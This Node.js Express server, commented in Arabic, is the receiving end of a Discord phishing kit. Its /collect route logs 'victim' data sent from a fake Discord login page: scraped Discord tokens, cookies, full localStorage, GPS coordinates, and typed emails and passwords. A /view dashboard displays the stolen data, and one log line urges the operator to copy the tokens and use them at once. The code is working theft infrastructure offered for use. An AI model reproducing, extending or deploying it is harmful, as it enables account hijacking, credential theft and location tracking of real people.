const express = require('express');
const fs = require('fs');
const app = express();
const port = 3000;

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

function formatLogEntry(data, ip, userAgent) {
    const lines = [];
    const separator = '═'.repeat(70);
    
    lines.push(separator);
    lines.push('📌 بيانات ضحية جديدة');
    lines.push(`🕒 التوقيت: ${new Date().toISOString()}`);
    lines.push(`🌐 الـ IP: ${ip}`);
    lines.push(`💻 المتصفح: ${userAgent}`);
    lines.push(separator);
    
    // ================================================================
    // 🔥 عرض التوكنات أولاً وأكثر بروزاً 🔥
    // ================================================================
    
    if (data.discordTokensFound && data.discordTokensFound.length > 0) {
        lines.push('\n' + '🚨'.repeat(10));
        lines.push('🔥🔥🔥 تم العثور على توكنات دسكورد 🔥🔥🔥');
        lines.push('🚨'.repeat(10));
        lines.push(`📊 عدد التوكنات: ${data.discordTokensCount || data.discordTokensFound.length}`);
        lines.push('');
        
        data.discordTokensFound.forEach(function(item, index) {
            lines.push(`┌─ التوكن #${index + 1}`);
            lines.push(`│ 📍 المصدر: ${item.source}`);
            lines.push(`│ 🔑 المفتاح: ${item.key}`);
            lines.push(`│ 🎫 القيمة: ${item.value}`);
            if (item.value.length > 80) {
                lines.push(`│ 📝 الطول: ${item.value.length} حرف`);
            }
            lines.push(`└─`);
            lines.push('');
        });
        
        lines.push('🚨'.repeat(10));
        lines.push('⚠️ انسخ هذه التوكنات فوراً واستخدمها');
        lines.push('🚨'.repeat(10));
    } else {
        lines.push('\n❌❌❌ لم يتم العثور على أي توكن دسكورد ❌❌❌');
        lines.push('💡 قد يكون الضحية ليس لديه جلسة دسكورد مفتوحة');
    }
    
    // ================================================================
    // بقية البيانات
    // ================================================================
    
    lines.push('\n' + '─'.repeat(50));
    lines.push('📱 معلومات الجهاز:');
    lines.push(`   - نظام التشغيل: ${data.platform || 'غير معروف'}`);
    lines.push(`   - اللغة: ${data.language || 'غير معروف'}`);
    lines.push(`   - دقة الشاشة: ${data.screenWidth || '?'} × ${data.screenHeight || '?'}`);
    lines.push(`   - المنطقة الزمنية: ${data.timezone || 'غير معروف'}`);
    
    if (data.location) {
        if (data.location.lat) {
            lines.push(`\n📍 الموقع الجغرافي:`);
            lines.push(`   - خط العرض: ${data.location.lat}`);
            lines.push(`   - خط الطول: ${data.location.lng}`);
            lines.push(`   - الدقة: ${data.location.accuracy} متر`);
            lines.push(`   - خريطة: https://maps.google.com/?q=${data.location.lat},${data.location.lng}`);
        } else if (data.location.error) {
            lines.push(`\n📍 الموقع: فشل - ${data.location.error}`);
        }
    }
    
    if (data.cookies) {
        const cookies = data.cookies.split(';').filter(c => c.trim());
        if (cookies.length > 0) {
            lines.push(`\n🍪 عدد الكوكيز: ${cookies.length}`);
            cookies.forEach(c => lines.push(`   🍪 ${c.trim()}`));
        }
    }
    
    // ================================================================
    // بيانات من نموذج الدسكورد الوهمي
    // ================================================================
    
    if (data.discordEmail || data.discordPassword || data.discordToken) {
        lines.push('\n' + '🎯'.repeat(10));
        lines.push('🎯 بيانات من نموذج الدسكورد الوهمي (مدخل يدوي)');
        if (data.discordEmail) lines.push(`   📧 البريد: ${data.discordEmail}`);
        if (data.discordPassword) lines.push(`   🔒 كلمة المرور: ${data.discordPassword}`);
        if (data.discordToken) lines.push(`   🎫 التوكن المدخل: ${data.discordToken}`);
        if (data.extra) lines.push(`   📌 ملاحظة: ${data.extra}`);
        lines.push('🎯'.repeat(10));
    }
    
    // ================================================================
    // محتويات التخزين (قد تحتوي على توكنات إضافية)
    // ================================================================
    
    if (data.fullLocalStorage) {
        const ls = data.fullLocalStorage;
        if (Object.keys(ls).length > 0 && !ls.error) {
            lines.push('\n💾 محتويات localStorage:');
            for (const key in ls) {
                let val = ls[key];
                if (typeof val === 'string' && val.length > 100) {
                    val = val.substring(0, 100) + '...';
                }
                // تمييز المفاتيح التي قد تحتوي على توكن
                const isTokenKey = key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth');
                const prefix = isTokenKey ? '🔑' : '📁';
                lines.push(`   ${prefix} ${key}: ${val}`);
            }
        }
    }
    
    lines.push('\n' + separator);
    lines.push('🏁 نهاية البيانات');
    lines.push(separator + '\n');
    
    return lines.join('\n');
}

app.post('/collect', (req, res) => {
    const data = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'غير معروف';
    
    const formattedText = formatLogEntry(data, ip, userAgent);
    fs.appendFileSync('data.log', formattedText, 'utf8');
    console.log('✅ تم استقبال بيانات جديدة');
    res.sendStatus(200);
});

app.get('/view', (req, res) => {
    if (fs.existsSync('data.log')) {
        const content = fs.readFileSync('data.log', 'utf8');
        res.send(`<html><head><title>البيانات المجمعة</title><style>
            body { background: #0d1117; color: #e6edf3; font-family: 'Courier New', monospace; padding: 30px; }
            pre { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; font-size: 14px; line-height: 1.7; white-space: pre-wrap; word-wrap: break-word; direction: ltr; text-align: left; }
            .header { color: #58a6ff; font-size: 24px; margin-bottom: 10px; }
            .token-alert { color: #ff6b6b; font-size: 20px; font-weight: bold; }
            .footer { color: #8b949e; font-size: 12px; margin-top: 20px; }
        </style></head><body>
            <h1 class="header">📊 البيانات المجمعة</h1>
            <div class="token-alert">⚠️ ابحث عن 🔥🔥🔥 في الأسفل للتوكنات</div>
            <pre>${content}</pre>
            <p class="footer">🔄 تحديث تلقائي كل 30 ثانية | <a href="/view" style="color:#58a6ff;">تحديث يدوي</a></p>
            <script>setTimeout(function(){ location.reload(); }, 30000);</script>
        </body></html>`);
    } else {
        res.send('📭 لا توجد بيانات حتى الآن. انتظر حتى يزور أحدهم الموقع.');
    }
});

app.listen(port, () => {
    console.log(`🚀 Server running on port ${port}`);
});
